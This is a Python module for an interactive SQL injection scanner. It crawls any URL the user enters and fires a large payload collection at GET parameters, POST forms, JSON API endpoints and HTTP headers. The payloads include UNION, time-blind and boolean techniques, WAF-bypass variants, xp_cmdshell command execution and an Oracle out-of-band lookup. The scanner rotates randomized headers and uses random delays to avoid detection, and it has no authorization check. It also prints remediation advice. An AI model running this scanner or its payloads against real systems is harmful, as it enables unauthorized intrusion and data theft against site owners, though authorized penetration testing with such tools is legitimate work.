# modules/sqli_scan.py
import requests
import time
import random
import re
import json
import os
import csv
import html
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Confirm, Prompt
from datetime import datetime
from core.randomizer import HeaderFactory

console = Console()
header_factory = HeaderFactory(pool_size=500)

class SQLiScanner:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.baseline_latencies = {}
        self.csrf_tokens = {}
        
    def get_sqli_payloads(self):
        """Enhanced payload collection with database-specific and advanced techniques"""
        return {
            'basic': [
                "' OR '1'='1'-- ",
                "\" OR 1=1 -- ",
                "' OR 'a'='a",
                "') OR ('a'='a",
                "1 OR 1=1",
            ],
            'mysql': [
                "' OR 1=1#",
                "/*'*/OR'1'='1'--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10#",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
                "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT version())))-- ",
            ],
            'postgresql': [
                "';SELECT PG_SLEEP(5)--",
                "' OR 1=1--",
                "' UNION SELECT NULL,version(),NULL--",
                "' AND (SELECT 1 FROM pg_sleep(5))::text='1",
            ],
            'mssql': [
                "1' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' AND 1=(SELECT COUNT(*) FROM sysobjects)--",
            ],
            'oracle': [
                "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ],
            'mongodb': [
                "{'$where': 'this.username == this.username'}",
                "{'$regex': '.*'}",
                "{'$ne': null}",
                "'; return true; var dummy='",
            ],
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
            ],
            'time_blind': [
                "SLEEP(5)#",
                "';SELECT PG_SLEEP(5)--",
                "1' WAITFOR DELAY '0:0:5'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--",
                "'; EXEC master.dbo.xp_cmdshell 'ping -n 6 127.0.0.1'--",
            ],
            'waf_bypass': [
                "/*!50000OR*/1=1--",
                "/**/OR/**/1=1--",
                "'/**/OR/**/1=1--",
                "'+OR+1=1--",
                "'%20OR%201=1--",
                "'/*%2A*/OR/*%2A*/1=1--",
                "'||'1'='1",
                "' or(1)=1#",
                "' or+(1)=(1)#",
            ]
        }

    def get_error_patterns(self):
        """Comprehensive error patterns for various database systems"""
        return [
            # MySQL
            r"MySQL server version",
            r"mysql_fetch_array\(\)",
            r"mysql_connect\(\)",
            r"mysql_query\(\)",
            r"You have an error in your SQL syntax",
            r"supplied argument is not a valid MySQL",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            
            # Microsoft SQL Server
            r"Microsoft.*ODBC.*SQL Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*\Wmssql_",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft JET Database Engine",
            r"Access Database Engine",
            
            # Oracle
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            
            # IBM DB2
            r"CLI Driver.*DB2",
            r"DB2 SQL error",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            
            # Generic SQL errors
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"SQL command not properly ended",
            r"ORA-00933",
            r"syntax error at or near",
            r"unclosed quotation mark after the character string",
        ]

    def calculate_baseline_latency(self, url, param, headers, num_tests=3):
        """Calculate baseline response time for accurate time-based SQLi detection"""
        console.print(f"[dim]Calculating baseline latency for {param}...[/dim]")
        latencies = []
        
        for _ in range(num_tests):
            try:
                start_time = time.time()
                test_url = f"{url}?{param}=normal_value"
                response = self.session.get(test_url, headers=headers, timeout=10)
                elapsed = time.time() - start_time
                latencies.append(elapsed)
                time.sleep(random.uniform(0.5, 1.5))  # Random delay
            except:
                continue
                
        if latencies:
            baseline = sum(latencies) / len(latencies)
            self.baseline_latencies[f"{url}:{param}"] = baseline
            return baseline
        return 1.0  # Default baseline

    def extract_csrf_token(self, response_text, form=None):
        """Extract CSRF tokens from response"""
        patterns = [
            r'<input[^>]*name=["\']?_token["\']?[^>]*value=["\']([^"\']*)["\']',
            r'<input[^>]*name=["\']?csrf_token["\']?[^>]*value=["\']([^"\']*)["\']',
            r'<meta[^>]*name=["\']?csrf-token["\']?[^>]*content=["\']([^"\']*)["\']',
            r'<input[^>]*name=["\']?authenticity_token["\']?[^>]*value=["\']([^"\']*)["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        # Check form for CSRF if form object provided
        if form:
            for input_tag in form.find_all("input"):
                if input_tag.get("name", "").lower() in ["_token", "csrf_token", "authenticity_token"]:
                    return input_tag.get("value", "")
        
        return None

    def test_boolean_blind_sqli(self, url, param, headers):
        """Test for boolean-based blind SQL injection"""
        true_payload = "' AND 1=1--"
        false_payload = "' AND 1=2--"
        
        try:
            # Get baseline response
            baseline_url = f"{url}?{param}=normal_value"
            baseline_response = self.session.get(baseline_url, headers=headers, timeout=10)
            baseline_length = len(baseline_response.text)
            
            # Test true condition
            true_url = f"{url}?{param}={true_payload}"
            true_response = self.session.get(true_url, headers=headers, timeout=10)
            
            # Test false condition  
            false_url = f"{url}?{param}={false_payload}"
            false_response = self.session.get(false_url, headers=headers, timeout=10)
            
            # Compare response lengths and content
            true_length = len(true_response.text)
            false_length = len(false_response.text)
            
            # If responses differ significantly, might be boolean blind SQLi
            if abs(true_length - false_length) > 100 or true_response.status_code != false_response.status_code:
                return True, "Boolean-based blind SQLi detected"
                
        except Exception as e:
            pass
        
        return False, ""

    def test_post_form(self, form_url, form_data, headers, payloads):
        """Test POST forms for SQL injection"""
        vulnerabilities = []
        
        try:
            # Get form page first to extract CSRF token
            form_page = self.session.get(form_url, headers=headers, timeout=10)
            csrf_token = self.extract_csrf_token(form_page.text)
            
            if csrf_token:
                form_data["_token"] = csrf_token
                form_data["csrf_token"] = csrf_token
            
            for param in form_data.keys():
                if param.startswith(('_', 'csrf')):  # Skip CSRF tokens
                    continue
                    
                # Calculate baseline for this form
                baseline_start = time.time()
                baseline_response = self.session.post(form_url, data=form_data, headers=headers, timeout=10)
                baseline_time = time.time() - baseline_start
                baseline_length = len(baseline_response.text)
                
                for category, payload_list in payloads.items():
                    for payload in payload_list:
                        test_data = form_data.copy()
                        test_data[param] = payload
                        
                        try:
                            start_time = time.time()
                            response = self.session.post(form_url, data=test_data, headers=headers, timeout=10)
                            elapsed_time = time.time() - start_time
                            
                            # Check for vulnerabilities
                            vulnerable = False
                            vuln_type = ""
                            
                            # Time-based detection (dynamic threshold)
                            if elapsed_time > (baseline_time + 4):
                                vulnerable = True
                                vuln_type = "Time-based SQLi"
                            
                            # Error-based detection
                            for pattern in self.get_error_patterns():
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vulnerable = True
                                    vuln_type = "Error-based SQLi"
                                    break
                            
                            # Content-based detection (for boolean blind)
                            response_length = len(response.text)
                            if abs(response_length - baseline_length) > 200:
                                vulnerable = True
                                vuln_type = "Possible Boolean-based SQLi"
                            
                            if vulnerable:
                                vulnerabilities.append({
                                    'method': 'POST',
                                    'url': form_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'type': vuln_type,
                                    'response_time': elapsed_time
                                })
                                
                        except Exception as e:
                            continue
                        
                        # Rate limiting
                        time.sleep(random.uniform(0.5, 2.0))
                        
        except Exception as e:
            console.print(f"[yellow]Error testing POST form {form_url}: {e}[/yellow]")
        
        return vulnerabilities

    def discover_forms_and_endpoints(self, base_url, headers):
        """Enhanced discovery including forms, API endpoints, and JSON parameters"""
        console.print(f"[cyan]Performing comprehensive discovery on {base_url}...[/cyan]")
        
        links_to_scan = {base_url}
        discovered_params = set()
        forms_to_test = []
        api_endpoints = set()
        
        try:
            response = self.session.get(base_url, headers=headers, timeout=10, allow_redirects=True)
            soup = BeautifulSoup(response.content, "html.parser")
            
            # Extract CSRF token for this page
            csrf_token = self.extract_csrf_token(response.text)
            if csrf_token:
                self.csrf_tokens[base_url] = csrf_token
            
            # Discover forms and their parameters
            for form in soup.find_all("form"):
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()
                form_url = urljoin(base_url, form_action) if form_action else base_url
                
                form_data = {}
                for input_tag in form.find_all(["input", "textarea", "select"]):
                    name = input_tag.get("name")
                    if name:
                        value = input_tag.get("value", "test")
                        form_data[name] = value
                        discovered_params.add(name)
                
                if form_data and form_method == "post":
                    forms_to_test.append({
                        'url': form_url,
                        'data': form_data,
                        'csrf_token': self.extract_csrf_token(response.text, form)
                    })
            
            # Discover links and URL parameters
            for a_tag in soup.find_all("a", href=True):
                href = a_tag['href']
                full_url = urljoin(base_url, href)
                parsed_url = urlparse(full_url)
                
                if urlparse(base_url).netloc == parsed_url.netloc:
                    links_to_scan.add(full_url)
                    
                    # Extract parameters from URLs
                    if parsed_url.query:
                        params = parse_qs(parsed_url.query)
                        discovered_params.update(params.keys())
            
            # Look for potential API endpoints
            script_tags = soup.find_all("script")
            for script in script_tags:
                if script.string:
                    # Find API endpoints in JavaScript
                    api_patterns = [
                        r'["\'](/api/[^"\']*)["\']',
                        r'["\'](/v\d+/[^"\']*)["\']',
                        r'fetch\(["\']([^"\']*)["\']',
                        r'axios\.[get|post]+\(["\']([^"\']*)["\']'
                    ]
                    for pattern in api_patterns:
                        matches = re.findall(pattern, script.string)
                        for match in matches:
                            api_url = urljoin(base_url, match)
                            api_endpoints.add(api_url)
            
        except Exception as e:
            console.print(f"[yellow]Discovery error for {base_url}: {e}[/yellow]")
        
        # Add common parameters if none found
        if not discovered_params:
            discovered_params.update(['id', 'user', 'page', 'search', 'q', 'category', 'item'])
        
        console.print(f"[green]Discovery complete: {len(links_to_scan)} links, {len(discovered_params)} params, {len(forms_to_test)} forms, {len(api_endpoints)} API endpoints[/green]")
        return list(links_to_scan), list(discovered_params), forms_to_test, list(api_endpoints)

    def test_api_endpoint(self, endpoint, headers, payloads):
        """Test API endpoints for JSON-based SQL injection"""
        vulnerabilities = []
        
        try:
            # Try common JSON parameters
            json_params = ['id', 'user_id', 'search', 'query', 'filter']
            
            for param in json_params:
                # Calculate baseline
                baseline_json = {param: "normal_value"}
                try:
                    baseline_start = time.time()
                    baseline_response = self.session.post(endpoint, json=baseline_json, headers=headers, timeout=10)
                    baseline_time = time.time() - baseline_start
                    baseline_length = len(baseline_response.text)
                except:
                    continue
                
                for category, payload_list in payloads.items():
                    for payload in payload_list:
                        test_json = {param: payload}
                        
                        try:
                            start_time = time.time()
                            response = self.session.post(endpoint, json=test_json, headers=headers, timeout=10)
                            elapsed_time = time.time() - start_time
                            
                            # Check for vulnerabilities
                            vulnerable = False
                            vuln_type = ""
                            
                            # Time-based detection
                            if elapsed_time > (baseline_time + 4):
                                vulnerable = True
                                vuln_type = "Time-based SQLi (JSON)"
                            
                            # Error-based detection
                            for pattern in self.get_error_patterns():
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vulnerable = True
                                    vuln_type = "Error-based SQLi (JSON)"
                                    break
                            
                            if vulnerable:
                                vulnerabilities.append({
                                    'method': 'POST (JSON)',
                                    'url': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'type': vuln_type,
                                    'response_time': elapsed_time
                                })
                        
                        except Exception:
                            continue
                        
                        time.sleep(random.uniform(0.3, 1.0))
        
        except Exception as e:
            console.print(f"[yellow]Error testing API endpoint {endpoint}: {e}[/yellow]")
        
        return vulnerabilities

    def test_header_injection(self, url, headers, payloads):
        """Test for SQL injection in HTTP headers"""
        vulnerabilities = []
        injectable_headers = ['User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'Referer']
        
        for header_name in injectable_headers:
            for category, payload_list in payloads.items():
                if category == 'time_blind':  # Focus on time-based for headers
                    for payload in payload_list[:3]:  # Limit header tests
                        test_headers = headers.copy()
                        test_headers[header_name] = payload
                        
                        try:
                            start_time = time.time()
                            response = self.session.get(url, headers=test_headers, timeout=10)
                            elapsed_time = time.time() - start_time
                            
                            # Check for time-based vulnerability
                            if elapsed_time > 4:
                                vulnerabilities.append({
                                    'method': 'HEADER',
                                    'url': url,
                                    'parameter': header_name,
                                    'payload': payload,
                                    'type': 'Header-based Time SQLi',
                                    'response_time': elapsed_time
                                })
                        except:
                            continue
                        
                        time.sleep(random.uniform(0.5, 1.0))
        
        return vulnerabilities

    def export_report(self, vulnerabilities, target_domain, format_type="html"):
        """Export comprehensive vulnerability report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_dir = os.path.join("reports", "sqli_results")
        os.makedirs(report_dir, exist_ok=True) 
        filename = os.path.join(report_dir, f"sqli_report_{target_domain}_{timestamp}")
        
        if format_type.lower() == "csv":
            filename += ".csv"
            with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
                if vulnerabilities:
                    fieldnames = vulnerabilities[0].keys()
                    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                    writer.writeheader()
                    writer.writerows(vulnerabilities)
                
        elif format_type.lower() == "html":
            filename += ".html"
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SQLi Scan Report - {target_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #ff7675; color: white; padding: 15px; border-radius: 5px; }}
        .vuln {{ background-color: #ffe6e6; padding: 10px; margin: 10px 0; border-left: 4px solid #ff7675; }}
        .safe {{ background-color: #e6ffe6; padding: 10px; margin: 10px 0; border-left: 4px solid #00b894; }}
        .details {{ font-family: monospace; background-color: #f8f9fa; padding: 5px; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SQL Injection Vulnerability Report</h1>
        <p>Target: {target_domain} | Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>Total Vulnerabilities Found: {len(vulnerabilities)}</p>
    </div>
"""
            
            if vulnerabilities:
                html_content += "<h2>Vulnerabilities Detected</h2>"
                for vuln in vulnerabilities:
                    html_content += f"""
    <div class="vuln">
        <h3>🚨 {vuln['type']}</h3>
        <div class="details">
            <strong>Method:</strong> {vuln['method']}<br>
            <strong>URL:</strong> {html.escape(vuln['url'])}<br>
            <strong>Parameter:</strong> {html.escape(vuln['parameter'])}<br>
            <strong>Payload:</strong> {html.escape(vuln['payload'])}<br>
            <strong>Response Time:</strong> {vuln.get('response_time', 'N/A'):.2f}s
        </div>
    </div>
"""
            else:
                html_content += """
    <div class="safe">
        <h2>✅ No SQL Injection Vulnerabilities Detected</h2>
        <p>The target appears to be secure against the tested SQL injection techniques.</p>
    </div>
"""
            
            html_content += """
</body>
</html>
"""
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
        
        console.print(f"[green]Report exported to {filename}[/green]")
        return filename

    def run_comprehensive_scan(self):
        """Main enhanced scanning function"""
        console.print(Panel.fit("[b]Enhanced SQL Injection (SQLi) Scanner v2.0[/b]", style="#ff7675", padding=(1, 2)))
        
        # Get target URL
        url = console.input("\n[bold]Enter target URL: [/]").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Configuration options
        test_forms = Confirm.ask("Test POST forms?", default=True)
        test_headers = Confirm.ask("Test header injection?", default=True) 
        test_apis = Confirm.ask("Test API endpoints?", default=True)
        export_format = Prompt.ask("Export format", choices=["html", "csv", "none"], default="html")
        
        headers = header_factory.get_headers()
        payloads = self.get_sqli_payloads()
        
        try:
            # Discovery phase
            links_to_scan, discovered_params, forms_to_test, api_endpoints = self.discover_forms_and_endpoints(url, headers)
            
            # Calculate total tests
            total_tests = (len(links_to_scan) * len(discovered_params) * 
                          sum(len(p) for p in payloads.values()))
            if test_forms:
                total_tests += len(forms_to_test) * 50  # Estimate
            if test_apis:
                total_tests += len(api_endpoints) * 30  # Estimate
            if test_headers:
                total_tests += len(links_to_scan) * 20  # Estimate
                
            # Create report table
            report = Table(
                title=f"SQLi Vulnerability Report - {urlparse(url).netloc}",
                style="bright_white",
                header_style="bold #ff7675",
                expand=True
            )
            report.add_column("Method", style="cyan")
            report.add_column("Location", style="blue")
            report.add_column("Parameter", style="magenta")
            report.add_column("Payload", style="dim")
            report.add_column("Vulnerability Type", style="red")
            report.add_column("Response Time", style="yellow")
            
            progress = Progress(
                SpinnerColumn(),
                "[progress.description]{task.description}",
                BarColumn(),
                "{task.completed}/{task.total}",
                TextColumn("[bold green]{task.fields[status]}"),
                transient=True
            )
            
            with Live(report, console=console, screen=False):
                with progress:
                    task = progress.add_task("[cyan]Scanning for SQLi vulnerabilities...", total=total_tests, status="Starting...")
                    
                    # Test GET parameters
                    for link in links_to_scan:
                        for param in discovered_params:
                            # Calculate baseline latency
                            baseline = self.calculate_baseline_latency(link, param, headers)
                            
                            for category, payload_list in payloads.items():
                                for payload in payload_list:
                                    progress.update(task, advance=1, status=f"Testing GET {param} on {link[:40]}...")
                                    
                                    test_url = f"{link}?{param}={requests.utils.quote(payload)}"
                                    
                                    try:
                                        start_time = time.time()
                                        response = self.session.get(test_url, headers=headers, timeout=12)
                                        elapsed_time = time.time() - start_time
                                        
                                        vulnerable = False
                                        vuln_type = ""
                                        
                                        # Enhanced time-based detection
                                        if elapsed_time > (baseline + 4):
                                            vulnerable = True
                                            vuln_type = "Time-based SQLi"
                                        
                                        # Error pattern detection
                                        for pattern in self.get_error_patterns():
                                            if re.search(pattern, response.text, re.IGNORECASE):
                                                vulnerable = True
                                                vuln_type = "Error-based SQLi"
                                                break
                                        
                                        # Boolean-based detection for specific payloads
                                        if category == 'boolean_blind':
                                            is_bool_vuln, bool_msg = self.test_boolean_blind_sqli(link, param, headers)
                                            if is_bool_vuln:
                                                vulnerable = True
                                                vuln_type = "Boolean-based SQLi"
                                        
                                        if vulnerable:
                                            self.vulnerabilities.append({
                                                'method': 'GET',
                                                'url': link,
                                                'parameter': param,
                                                'payload': payload,
                                                'type': vuln_type,
                                                'response_time': elapsed_time
                                            })
                                            
                                            display_payload = payload[:30] + "..." if len(payload) > 30 else payload
                                            report.add_row(
                                                "GET",
                                                f"[cyan]{link[:50]}...[/cyan]" if len(link) > 50 else f"[cyan]{link}[/cyan]",
                                                f"[magenta]{param}[/magenta]",
                                                f"[dim]{display_payload}[/dim]",
                                                f"[red]{vuln_type}[/red]",
                                                f"[yellow]{elapsed_time:.2f}s[/yellow]"
                                            )
                                    
                                    except Exception:
                                        continue
                                    
                                    # Rate limiting with randomization
                                    time.sleep(random.uniform(0.3, 1.2))
                    
                    # Test POST forms
                    if test_forms and forms_to_test:
                        progress.update(task, status="Testing POST forms...")
                        for form_info in forms_to_test:
                            form_vulns = self.test_post_form(
                                form_info['url'], 
                                form_info['data'], 
                                headers, 
                                payloads
                            )
                            
                            for vuln in form_vulns:
                                self.vulnerabilities.append(vuln)
                                display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
                                report.add_row(
                                    vuln['method'],
                                    f"[cyan]{vuln['url'][:50]}...[/cyan]" if len(vuln['url']) > 50 else f"[cyan]{vuln['url']}[/cyan]",
                                    f"[magenta]{vuln['parameter']}[/magenta]",
                                    f"[dim]{display_payload}[/dim]",
                                    f"[red]{vuln['type']}[/red]",
                                    f"[yellow]{vuln.get('response_time', 0):.2f}s[/yellow]"
                                )
                            
                            progress.update(task, advance=len(form_vulns))
                    
                    # Test API endpoints
                    if test_apis and api_endpoints:
                        progress.update(task, status="Testing API endpoints...")
                        for endpoint in api_endpoints:
                            api_vulns = self.test_api_endpoint(endpoint, headers, payloads)
                            
                            for vuln in api_vulns:
                                self.vulnerabilities.append(vuln)
                                display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
                                report.add_row(
                                    vuln['method'],
                                    f"[cyan]{vuln['url'][:50]}...[/cyan]" if len(vuln['url']) > 50 else f"[cyan]{vuln['url']}[/cyan]",
                                    f"[magenta]{vuln['parameter']}[/magenta]",
                                    f"[dim]{display_payload}[/dim]",
                                    f"[red]{vuln['type']}[/red]",
                                    f"[yellow]{vuln.get('response_time', 0):.2f}s[/yellow]"
                                )
                            
                            progress.update(task, advance=len(api_vulns))
                    
                    # Test header injection
                    if test_headers:
                        progress.update(task, status="Testing header injection...")
                        for link in links_to_scan[:3]:  # Limit header tests to first 3 links
                            header_vulns = self.test_header_injection(link, headers, payloads)
                            
                            for vuln in header_vulns:
                                self.vulnerabilities.append(vuln)
                                display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
                                report.add_row(
                                    vuln['method'],
                                    f"[cyan]{vuln['url'][:50]}...[/cyan]" if len(vuln['url']) > 50 else f"[cyan]{vuln['url']}[/cyan]",
                                    f"[magenta]{vuln['parameter']}[/magenta]",
                                    f"[dim]{display_payload}[/dim]",
                                    f"[red]{vuln['type']}[/red]",
                                    f"[yellow]{vuln.get('response_time', 0):.2f}s[/yellow]"
                                )
                            
                            progress.update(task, advance=len(header_vulns))
                    
                    progress.update(task, status="Scan completed!")
            
            # Display final results
            console.print("\n")
            if self.vulnerabilities:
                console.print(Panel(
                    f"[bold red]🚨 {len(self.vulnerabilities)} SQL Injection vulnerabilities detected![/bold red]\n"
                    f"[yellow]Immediate remediation recommended.[/yellow]",
                    title="[bold]Security Alert[/bold]",
                    style="red"
                ))
                
                # Group vulnerabilities by type
                vuln_types = {}
                for vuln in self.vulnerabilities:
                    vuln_type = vuln['type']
                    if vuln_type not in vuln_types:
                        vuln_types[vuln_type] = 0
                    vuln_types[vuln_type] += 1
                
                summary_table = Table(title="Vulnerability Summary", style="bright_white")
                summary_table.add_column("Vulnerability Type", style="cyan")
                summary_table.add_column("Count", style="red", justify="center")
                
                for vuln_type, count in vuln_types.items():
                    summary_table.add_row(vuln_type, str(count))
                
                console.print(summary_table)
                
            else:
                console.print(Panel(
                    "[bold green]✅ No SQL Injection vulnerabilities detected![/bold green]\n"
                    "[dim]Target appears to be properly secured against SQLi attacks.[/dim]",
                    title="[bold]Security Status[/bold]",
                    style="green"
                ))
            
            console.print(Panel(report, title="[bold]Detailed Results[/bold]", style="#ff7675"))
            
            # Export report
            if export_format != "none":
                target_domain = urlparse(url).netloc.replace(".", "_")
                report_file = self.export_report(self.vulnerabilities, target_domain, export_format)
                console.print(f"\n[green]📄 Detailed report saved as: {report_file}[/green]")
            
            # Security recommendations
            if self.vulnerabilities:
                console.print("\n")
                console.print(Panel(
                    "[bold]Security Recommendations:[/bold]\n\n"
                    "• [cyan]Use parameterized queries/prepared statements[/cyan]\n"
                    "• [cyan]Implement proper input validation and sanitization[/cyan]\n"
                    "• [cyan]Use ORM frameworks with built-in protection[/cyan]\n"
                    "• [cyan]Apply principle of least privilege to database accounts[/cyan]\n"
                    "• [cyan]Deploy Web Application Firewall (WAF)[/cyan]\n"
                    "• [cyan]Regular security testing and code reviews[/cyan]\n"
                    "• [cyan]Keep database software updated[/cyan]",
                    title="[bold]Remediation Guide[/bold]",
                    style="yellow"
                ))
        
        except Exception as e:
            console.print(f"[bold red]Scan failed: {e}[/bold red]")
            console.print("[dim]Please check your internet connection and target URL.[/dim]")

def run_sqli_scan():
    """Entry point for the enhanced SQLi scanner"""
    scanner = SQLiScanner()
    
    try:
        scanner.run_comprehensive_scan()
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user.[/yellow]")
        if scanner.vulnerabilities:
            console.print(f"[cyan]Found {len(scanner.vulnerabilities)} vulnerabilities before interruption.[/cyan]")
            if Confirm.ask("Export partial results?"):
                target_domain = "interrupted_scan"
                scanner.export_report(scanner.vulnerabilities, target_domain, "html")
    except Exception as e:
        console.print(f"[bold red]Critical error: {e}[/bold red]")

if __name__ == "__main__":
    run_sqli_scan()